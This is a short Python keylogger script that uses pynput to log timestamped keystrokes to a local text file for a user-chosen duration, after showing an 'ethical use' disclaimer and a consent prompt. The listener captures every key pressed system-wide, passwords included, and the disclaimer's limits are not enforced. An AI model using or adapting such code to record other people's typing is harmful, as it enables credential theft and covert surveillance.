import pynput
import time
import os
import sys

# Set the path for the log file
log_output_path = "keystroke_log.txt"

# Function to log keystrokes
def log_keystroke(key):
    # Capture the timestamp and keystroke event
    current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    try:
        keystroke_info = f"{current_time} - {key.char}\n"
    except AttributeError:
        keystroke_info = f"{current_time} - {key}\n"

    # Write the logged keystroke to the file
    with open(log_output_path, "a") as logfile:
        logfile.write(keystroke_info)

# Display disclaimer and request user consent
print("---------------- Ethical Keylogger Disclaimer ----------------")
print("\nThis program is designed for educational purposes and ethical usage only.")
print("Unauthorized distribution or misuse of this software is strictly prohibited.")
print("By proceeding, you agree to the following conditions:")
print("\n1. You will use this software only on devices you have explicit permission for.")
print("2. You will comply with all relevant laws, regulations, and terms of service.")
print("3. You will not use this software to harm or disrupt any devices or systems.")
print("4. You will avoid using this software to capture sensitive or personal information.")
print("5. You will not redistribute or commercialize this program without consent.")
print("6. The developer holds no liability for any damages incurred through improper use.")
print("7. You agree to respect the privacy of all devices and systems involved.")

consent = input("\nDo you accept the terms and conditions? (y/n): ")

if consent.lower() != 'y':
    print("You must agree to the terms before using this software.")
    sys.exit()

# Request the duration for which keystrokes should be captured
try:
    capture_duration = int(input("Please enter the duration for logging keystrokes (in seconds): "))
except ValueError:
    print("Invalid input. Please enter a valid number.")
    sys.exit()

# Start the keylogger listener
keyboard_listener = pynput.keyboard.Listener(on_press=log_keystroke)
keyboard_listener.start()

# Log keystrokes for the specified duration
log_start = time.time()
log_end = log_start + capture_duration

while time.time() < log_end:
    time.sleep(1)

# Stop the keylogger listener after the duration
keyboard_listener.stop()

# Output the path of the log file
print("\nThe keystroke log has been saved to:", os.path.abspath(log_output_path))
